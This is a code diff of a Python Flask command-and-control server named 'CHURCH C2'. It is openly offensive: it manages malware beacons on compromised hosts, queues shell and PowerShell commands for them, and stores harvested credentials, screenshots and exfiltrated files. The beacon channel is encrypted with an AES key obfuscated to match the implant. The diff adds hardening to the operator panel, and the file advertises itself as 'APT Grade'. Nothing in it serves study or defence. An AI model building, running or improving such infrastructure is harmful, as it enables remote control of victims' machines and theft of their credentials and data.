@@ -1,69 +1,130 @@
 #!/usr/bin/env python3
 """
 CHURCH C2 SERVER
-Enterprise-level Command & Control infrastructure
-Features: Multi-session management, SQLite persistence, Web UI, REST API, 
-Plugin system, Report generation, Team collaboration, and Stealth operations
 """
 
-from flask import Flask, request, jsonify, make_response, render_template_string, session, redirect, url_for
-from flask_socketio import SocketIO, emit
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization, hashes
-from cryptography.hazmat.backends import default_backend
-from werkzeug.security import generate_password_hash, check_password_hash
-from functools import wraps
-import sqlite3
+import os
+import sys
+import time
 import json
 import base64
-import time
-import threading
-import queue
 import logging
 import argparse
-import sys
-import os
-import uuid
-import random
-import string
-import datetime
-import requests
-import ipaddress
-import hashlib
+import threading
+import sqlite3
 import secrets
+import hashlib
+import uuid
 from pathlib import Path
-from dataclasses import dataclass, asdict
-from typing import Dict, List, Optional, Any
+from functools import wraps
 from collections import defaultdict
+from datetime import timedelta
+
+from flask import (
+    Flask, request, jsonify, make_response,
+    render_template_string, session, redirect, url_for
+)
+from flask_socketio import SocketIO, emit
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+from werkzeug.security import generate_password_hash, check_password_hash
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 # ==================== CONFIGURATION ====================
-VERSION = "2.0.0"
-AES_KEY = b"ChurchOfMalware2024!!ChurchOfMalware2024!!"
-AES_IV = b"MalwareChurchIV!!"
-JWT_SECRET = secrets.token_hex(32)
-ADMIN_USERNAME = "admin"
-ADMIN_PASSWORD_HASH = generate_password_hash("CHURCHadmin2024!!")
+VERSION = "2.1.0"
+XOR_KEY = 0xDD
+CONFIG_FILE = "church_c2.cfg"
+JWT_SECRET_FILE = "jwt_secret.key"
 DATABASE_PATH = "church_c2.db"
 LOG_PATH = "church_c2.log"
 DOWNLOAD_PATH = "downloads"
 PLUGIN_PATH = "plugins"
 SSL_CERT = "cert.pem"
 SSL_KEY = "key.pem"
+ALLOWED_ORIGINS = ["https://localhost:443", "https://127.0.0.1:443"]  # adjust as needed
+
+# XOR-obfuscated AES key and IV (same as implant, key 0xDD)
+# Original: b"ChurchOfMalware2024!!ChurchOfMalware2024!!"
+AES_KEY_OBF = b"\xAB\xAA\xA8\xA3\xA7\xB6\xA8\xF5\xA8\xB3\xB4\xA8\xAB\xAA\xA8\xA3\xA7\xB6\xA8\xF5\xA8\xB3\xB4\xA8\xAA\xA5\xB1\xA7\xA5\xAD\xB4\x23"
+# Original: b"MalwareChurchIV!!"
+AES_IV_OBF  = b"\xB1\xB8\xB7\xAF\xB2\xB9\xA5\xA7\xA8\xB9\xA7\xA6\xF5\xF4\xF4\x23"
+
+def xor_deobfuscate(data: bytes) -> bytes:
+    return bytes([b ^ XOR_KEY for b in data])
+
+AES_KEY = xor_deobfuscate(AES_KEY_OBF)
+AES_IV  = xor_deobfuscate(AES_IV_OBF)
+
+# JWT secret – persist across restarts
+def get_or_create_jwt_secret():
+    if os.path.exists(JWT_SECRET_FILE):
+        with open(JWT_SECRET_FILE, "rb") as f:
+            return f.read().decode()
+    else:
+        secret = secrets.token_hex(32)
+        with open(JWT_SECRET_FILE, "w") as f:
+            f.write(secret)
+        os.chmod(JWT_SECRET_FILE, 0o600)
+        return secret
+
+JWT_SECRET = get_or_create_jwt_secret()
+
+# Admin credentials – read from config or env (never hardcoded)
+def get_admin_creds():
+    # Try config file first
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE) as f:
+            for line in f:
+                if line.startswith("ADMIN_USERNAME="):
+                    username = line.strip().split("=", 1)[1]
+                elif line.startswith("ADMIN_PASSWORD_HASH="):
+                    pwd_hash = line.strip().split("=", 1)[1]
+        if 'username' in locals() and 'pwd_hash' in locals():
+            return username, pwd_hash
+    # Fallback to environment variables
+    username = os.environ.get("CHURCH_ADMIN_USER", "admin")
+    pwd_hash = os.environ.get("CHURCH_ADMIN_HASH")
+    if not pwd_hash:
+        # Generate a random password on first run and print to console
+        random_pass = secrets.token_urlsafe(16)
+        pwd_hash = generate_password_hash(random_pass)
+        print(f"\n[!] No admin password set. Generated random password: {random_pass}")
+        print("[!] Save this immediately! You can change it via the web UI.\n")
+    return username, pwd_hash
+
+ADMIN_USERNAME, ADMIN_PASSWORD_HASH = get_admin_creds()
 
 # Initialize Flask
 app = Flask(__name__)
 app.config['SECRET_KEY'] = JWT_SECRET
-app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
-socketio = SocketIO(app, cors_allowed_origins="*")
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = True   # only over HTTPS
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
+
+# Rate limiter
+limiter = Limiter(
+    app,
+    key_func=get_remote_address,
+    default_limits=["200 per day", "50 per hour"],
+    storage_uri="memory://"
+)
+
+# SocketIO with strict CORS
+socketio = SocketIO(
+    app,
+    cors_allowed_origins=ALLOWED_ORIGINS,
+    logger=False,
+    engineio_logger=False
+)
 
 # ==================== DATABASE ====================
 def init_database():
-    """Initialize SQLite database with all tables"""
+    """Initialize SQLite database with all tables (idempotent)"""
     conn = sqlite3.connect(DATABASE_PATH)
     c = conn.cursor()
     
-    # Beacons table - stores all implant sessions
     c.execute('''CREATE TABLE IF NOT EXISTS beacons (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT UNIQUE NOT NULL,
@@ -87,7 +148,6 @@ def init_database():
         notes TEXT
     )''')
     
-    # Tasks table - command queue
     c.execute('''CREATE TABLE IF NOT EXISTS tasks (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -102,7 +162,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Results table - command output history
     c.execute('''CREATE TABLE IF NOT EXISTS results (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -112,7 +171,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Files table - downloaded files tracking
     c.execute('''CREATE TABLE IF NOT EXISTS files (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -125,7 +183,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Credentials table - harvested credentials
     c.execute('''CREATE TABLE IF NOT EXISTS credentials (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -137,7 +194,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Screenshots table
     c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -146,7 +202,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Tags table for beacon classification
     c.execute('''CREATE TABLE IF NOT EXISTS tags (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         beacon_id TEXT NOT NULL,
@@ -154,7 +209,6 @@ def init_database():
         FOREIGN KEY (beacon_id) REFERENCES beacons(beacon_id)
     )''')
     
-    # Users table for team collaboration
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT UNIQUE NOT NULL,
@@ -163,7 +217,6 @@ def init_database():
         created_at REAL
     )''')
     
-    # Audit log
     c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         username TEXT,
@@ -184,12 +237,12 @@ def init_database():
 
 # ==================== CRYPTOGRAPHY ====================
 class CryptoManager:
-    """Advanced cryptographic operations for C2 communication"""
-    
     @staticmethod
     def decrypt_aes(data_b64: str) -> bytes:
-        """AES-256-CBC decryption"""
-        ciphertext = base64.b64decode(data_b64)
+        """AES-256-CBC decryption with robust CRLF stripping"""
+        # Remove all whitespace and CRLF that may have been inserted by CryptBinaryToString
+        cleaned = ''.join(data_b64.split())
+        ciphertext = base64.b64decode(cleaned)
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
         decryptor = cipher.decryptor()
         plaintext = decryptor.update(ciphertext) + decryptor.finalize()
@@ -198,42 +251,21 @@ class CryptoManager:
     
     @staticmethod
     def encrypt_aes(plaintext: bytes) -> str:
-        """AES-256-CBC encryption"""
+        """AES-256-CBC encryption without extra whitespace"""
         pad_len = 16 - (len(plaintext) % 16)
         plaintext += bytes([pad_len]) * pad_len
         cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
         encryptor = cipher.encryptor()
         ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+        # No newlines in base64 – implant expects clean string
         return base64.b64encode(ciphertext).decode()
-    
-    @staticmethod
-    def generate_rsa_keypair() -> tuple:
-        """Generate RSA keypair for secure file transfers"""
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=4096,
-            backend=default_backend()
-        )
-        public_key = private_key.public_key()
-        return private_key, public_key
-    
-    @staticmethod
-    def rsa_encrypt(public_key_pem: bytes, data: bytes) -> bytes:
-        """RSA encryption for sensitive data"""
-        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
-        return public_key.encrypt(
-            data,
-            padding.OAEP(
-                mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                algorithm=hashes.SHA256(),
-                label=None
-            )
-        )
 
 # ==================== BEACON MANAGER ====================
+from dataclasses import dataclass, asdict
+from typing import Dict, List, Optional
+
 @dataclass
 class Beacon:
-    """Beacon session management"""
     beacon_id: str
     computer_name: str
     username: str
@@ -270,15 +302,12 @@ class Beacon:
         )
 
 class BeaconManager:
-    """Manages all active beacon sessions"""
-    
     def __init__(self):
         self._beacons: Dict[str, Beacon] = {}
         self._lock = threading.Lock()
         self._load_from_db()
     
     def _load_from_db(self):
-        """Load existing beacons from database"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute("SELECT * FROM beacons WHERE status = 'active'")
@@ -288,7 +317,7 @@ class BeaconManager:
         conn.close()
     
     def update_beacon(self, data: dict) -> Beacon:
-        """Update or create beacon from beacon data"""
+        # Use UUID to avoid collisions
         beacon_id = self._generate_beacon_id(data['computer'], data['user'])
         
         with self._lock:
@@ -318,16 +347,17 @@ class BeaconManager:
                 beacon.uptime = data.get('uptime', beacon.uptime)
                 beacon.defender_status = data.get('defender', beacon.defender_status)
                 self._update_beacon(beacon)
-            
             return beacon
     
     def _generate_beacon_id(self, computer: str, user: str) -> str:
-        """Generate unique beacon identifier"""
-        data = f"{computer}\\{user}".encode()
-        return hashlib.md5(data).hexdigest()[:16]
+        """Unique beacon ID using UUID to avoid collisions"""
+        # Use deterministic UUID v5 based on computer+user to keep same ID across sessions
+        # but still unique across different (computer,user) pairs
+        namespace = uuid.NAMESPACE_DNS
+        name = f"{computer}\\{user}"
+        return str(uuid.uuid5(namespace, name))
     
     def _save_beacon(self, beacon: Beacon):
-        """Save beacon to database"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute('''INSERT OR REPLACE INTO beacons 
@@ -345,11 +375,9 @@ class BeaconManager:
         conn.close()
     
     def _update_beacon(self, beacon: Beacon):
-        """Update existing beacon"""
         self._save_beacon(beacon)
     
     def get_pending_tasks(self, beacon_id: str) -> List[dict]:
-        """Get pending tasks for beacon"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute("SELECT id, command, arguments, task_type FROM tasks WHERE beacon_id = ? AND status = 'pending' ORDER BY created_at", (beacon_id,))
@@ -358,7 +386,6 @@ class BeaconManager:
         return tasks
     
     def mark_task_completed(self, task_id: int, output: str):
-        """Mark task as completed and store output"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute("UPDATE tasks SET status = 'completed', output = ?, completed_at = ? WHERE id = ?", 
@@ -368,7 +395,6 @@ class BeaconManager:
         self._audit("task_completed", str(task_id))
     
     def add_task(self, beacon_id: str, command: str, args: str = "", task_type: str = "cmd") -> int:
-        """Add task to beacon queue"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute('''INSERT INTO tasks (beacon_id, command, arguments, task_type, status, created_at)
@@ -381,7 +407,6 @@ class BeaconManager:
         return task_id
     
     def _audit(self, action: str, target: str):
-        """Log audit entry"""
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute("INSERT INTO audit_log (username, action, target, timestamp, ip_address) VALUES (?, ?, ?, ?, ?)",
@@ -390,12 +415,10 @@ class BeaconManager:
         conn.close()
     
     def get_all_beacons(self) -> List[Beacon]:
-        """Get all active beacons"""
         with self._lock:
             return list(self._beacons.values())
     
     def get_beacon(self, beacon_id: str) -> Optional[Beacon]:
-        """Get beacon by ID"""
         return self._beacons.get(beacon_id)
 
 beacon_manager = BeaconManager()
@@ -713,22 +736,87 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-# ==================== FLASK ROUTES ====================
+# ==================== AUTHENTICATION HELPERS ====================
 def require_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
+        # Check session cookie first (for web UI)
+        if session.get('authenticated'):
+            return f(*args, **kwargs)
+        # Then check X-Auth-Token header (for API clients)
         auth = request.headers.get('X-Auth-Token')
-        if auth != JWT_SECRET and not session.get('authenticated'):
-            return jsonify({"error": "Unauthorized"}), 401
-        return f(*args, **kwargs)
+        if auth and auth == JWT_SECRET:
+            return f(*args, **kwargs)
+        return jsonify({"error": "Unauthorized"}), 401
     return decorated
 
+@app.route('/login', methods=['POST'])
+def login():
+    """Web UI login endpoint"""
+    data = request.json
+    username = data.get('username')
+    password = data.get('password')
+    
+    conn = sqlite3.connect(DATABASE_PATH)
+    c = conn.cursor()
+    c.execute("SELECT password_hash, role FROM users WHERE username = ?", (username,))
+    row = c.fetchone()
+    conn.close()
+    
+    if row and check_password_hash(row[0], password):
+        session['authenticated'] = True
+        session['username'] = username
+        session['role'] = row[1]
+        return jsonify({"success": True})
+    return jsonify({"success": False}), 401
+
+@app.route('/logout', methods=['POST'])
+def logout():
+    session.clear()
+    return jsonify({"success": True})
+
+# ==================== FLASK ROUTES ====================
 @app.route('/')
 def index():
-    """Web UI"""
+    """Web UI - serves login page or dashboard based on session"""
+    if not session.get('authenticated'):
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head><title>Church C2 Login</title>
+        <style>
+            body { background: #0a0e27; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
+            .login { background: #0f0c29; border: 1px solid #00ffaa; padding: 30px; border-radius: 10px; width: 300px; }
+            input { width: 100%; padding: 10px; margin: 10px 0; background: #1a1a3e; border: 1px solid #00ffaa; color: #00ffaa; }
+            button { width: 100%; padding: 10px; background: #00ffaa; color: #0a0e27; border: none; cursor: pointer; }
+        </style>
+        </head>
+        <body>
+        <div class="login">
+            <h2>Church C2 Login</h2>
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="login()">Login</button>
+        </div>
+        <script>
+        function login() {
+            fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({username: document.getElementById('username').value, password: document.getElementById('password').value})
+            }).then(res => {
+                if (res.ok) location.reload();
+                else alert('Invalid credentials');
+            });
+        }
+        </script>
+        </body>
+        </html>
+        '''
     return render_template_string(HTML_TEMPLATE, version=VERSION)
 
 @app.route('/beacon', methods=['POST'])
+@limiter.limit("10 per minute")
 def beacon_handler():
     """Primary beacon endpoint - receives beacon data and returns tasks"""
     data = request.form.get('d') or request.form.get('data')
@@ -742,13 +830,9 @@ def beacon_handler():
         logging.error(f"Decrypt failed: {e}")
         return "Bad data", 400
     
-    # Update beacon in database
     beacon = beacon_manager.update_beacon(beacon_data)
-    
-    # Log beacon activity
     logging.info(f"BEACON: {beacon.computer_name}\\{beacon.username} | Admin: {beacon.is_admin} | Defender: {beacon.defender_status}")
     
-    # Get pending tasks
     pending_tasks = beacon_manager.get_pending_tasks(beacon.beacon_id)
     
     if pending_tasks:
@@ -763,13 +847,11 @@ def beacon_handler():
         response = json.dumps({"task_id": 0, "command": "", "args": "", "ps": False})
     
     encrypted_response = CryptoManager.encrypt_aes(response.encode())
-    
-    # Notify WebSocket clients
     socketio.emit('beacon_update', {'beacon_id': beacon.beacon_id})
-    
     return encrypted_response, 200, {'Content-Type': 'application/octet-stream'}
 
 @app.route('/beacon/result', methods=['POST'])
+@limiter.limit("10 per minute")
 def task_result():
     """Receive command output from beacon"""
     data = request.form.get('d') or request.form.get('data')
@@ -793,15 +875,15 @@ def task_result():
 
 @app.route('/api/beacons', methods=['GET'])
 @require_auth
+@limiter.limit("30 per minute")
 def api_beacons():
-    """API: List all beacons"""
     beacons = beacon_manager.get_all_beacons()
     return jsonify([b.to_dict() for b in beacons])
 
 @app.route('/api/beacon/<beacon_id>', methods=['GET'])
 @require_auth
+@limiter.limit("30 per minute")
 def api_beacon(beacon_id):
-    """API: Get specific beacon details"""
     beacon = beacon_manager.get_beacon(beacon_id)
     if not beacon:
         return jsonify({"error": "Beacon not found"}), 404
@@ -809,13 +891,12 @@ def api_beacon(beacon_id):
 
 @app.route('/api/task', methods=['POST'])
 @require_auth
+@limiter.limit("20 per minute")
 def api_add_task():
-    """API: Add task to beacon"""
     data = request.json
     if not data or 'host' not in data or 'command' not in data:
         return jsonify({"error": "Missing host or command"}), 400
     
-    # Resolve beacon ID (can be computer name or full beacon_id)
     beacon = None
     for b in beacon_manager.get_all_beacons():
         if b.beacon_id == data['host'] or b.computer_name == data['host']:
@@ -831,13 +912,12 @@ def api_add_task():
         data.get('args', ''),
         'powershell' if data.get('powershell', False) else 'cmd'
     )
-    
     return jsonify({"status": "added", "task_id": task_id})
 
 @app.route('/api/tasks/<beacon_id>', methods=['GET'])
 @require_auth
+@limiter.limit("30 per minute")
 def api_tasks(beacon_id):
-    """API: Get tasks for beacon"""
     conn = sqlite3.connect(DATABASE_PATH)
     c = conn.cursor()
     c.execute("SELECT id, command, arguments, task_type, status, output, created_at FROM tasks WHERE beacon_id = ? ORDER BY created_at DESC LIMIT 50", (beacon_id,))
@@ -847,8 +927,8 @@ def api_tasks(beacon_id):
 
 @app.route('/api/stats', methods=['GET'])
 @require_auth
+@limiter.limit("10 per minute")
 def api_stats():
-    """API: Get system statistics"""
     conn = sqlite3.connect(DATABASE_PATH)
     c = conn.cursor()
     c.execute("SELECT COUNT(*) FROM beacons WHERE status = 'active'")
@@ -875,10 +955,8 @@ def handle_connect():
 def handle_disconnect():
     print(f"[WebSocket] Client disconnected")
 
-# ==================== LOGGING & MONITORING ====================
+# ==================== LOGGING ====================
 class C2Logger:
-    """Advanced logging with rotation and encryption"""
-    
     def __init__(self, log_path: str):
         self.log_path = log_path
         self._setup_logging()
@@ -906,22 +984,20 @@ c2_logger = C2Logger(LOG_PATH)
 
 # ==================== CLEANUP THREAD ====================
 def cleanup_old_beacons():
-    """Remove stale beacons after timeout"""
     while True:
-        time.sleep(300)  # Every 5 minutes
-        timeout = time.time() - 3600  # 1 hour timeout
+        time.sleep(300)
+        timeout = time.time() - 3600
         conn = sqlite3.connect(DATABASE_PATH)
         c = conn.cursor()
         c.execute("UPDATE beacons SET status = 'stale' WHERE last_seen < ? AND status = 'active'", (timeout,))
         conn.commit()
         conn.close()
 
-# ==================== MAIN ENTRY POINT ====================
+# ==================== MAIN ====================
 def main():
-    parser = argparse.ArgumentParser(description='CHURCH C2 Server')
+    parser = argparse.ArgumentParser(description='CHURCH C2 Server - Hardened APT Grade')
     parser.add_argument('--host', default='0.0.0.0', help='Bind address')
-    parser.add_argument('--port', type=int, default=443, help='Bind port')
-    parser.add_argument('--http', action='store_true', help='Use HTTP instead of HTTPS')
+    parser.add_argument('--port', type=int, default=443, help='Bind port (HTTPS only)')
     parser.add_argument('--cert', default=SSL_CERT, help='SSL certificate path')
     parser.add_argument('--key', default=SSL_KEY, help='SSL key path')
     args = parser.parse_args()
@@ -935,30 +1011,19 @@ def main():
     cleanup_thread = threading.Thread(target=cleanup_old_beacons, daemon=True)
     cleanup_thread.start()
     
-    # Banner
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║                    CHURCH C2 SERVER v2.0                      ║
+    ║                    CHURCH C2 SERVER v2.1                      ║
     ║                      by ek0ms savi0r                          ║
-    ║                                                               ║
-    ║  [✓] AES-256-CBC Encrypted Channel                            ║
-    ║  [✓] SQLite Persistence                                       ║
-    ║  [✓] WebSocket Real-time Updates                              ║
-    ║  [✓] Multi-session Management                                 ║
-    ║  [✓] Task Queue System                                        ║
-    ║  [✓] Audit Logging                                            ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     
-    print(f"[*] Starting C2 server on {args.host}:{args.port}")
-    print(f"[*] Web UI: http{'s' if not args.http else ''}://{args.host}:{args.port}")
-    print(f"[*] API Key: {JWT_SECRET}")
-    print("[*] Default credentials: admin / CHURCHadmin2024!!")
+    print(f"[*] Starting C2 server on {args.host}:{args.port} (HTTPS only)")
+    print(f"[*] Web UI: https://{args.host}:{args.port}")
+    print(f"[*] API Key (for external tools): {JWT_SECRET}")
+    print(f"[*] Admin login: {ADMIN_USERNAME} (use password from config/env or random printed above)")
     
-    if args.http:
-        socketio.run(app, host=args.host, port=args.port, debug=False)
-    else:
-        socketio.run(app, host=args.host, port=args.port, ssl_context=(args.cert, args.key), debug=False)
+    socketio.run(app, host=args.host, port=args.port, ssl_context=(args.cert, args.key), debug=False)
 
 if __name__ == '__main__':
     main()
